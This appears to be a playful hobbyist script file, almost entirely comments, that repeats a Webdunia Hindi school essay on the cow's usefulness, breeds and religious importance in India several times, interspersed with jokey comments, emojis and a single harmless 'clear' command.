#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा





#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#यदि समझ आ गया तो अब सो जाओ






clear
























































#स्वगत है मेरा script में
































#आज हम सीखेंगे की गाय किसी कहते है ओर उसी के विषय मे सब कुछ



















#ओर नीचे आओ













#👇👇




































#👇👇👇👇










































































#👇👇👇👇👇👇👇👇👇👇👇








































































#यदि देखने का मन नही है तो मत देखो










































#👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
















































#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा








#फिर से पढ़ लो











#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा




#गाय पर हिन्दी में निबंध


#Webdunia
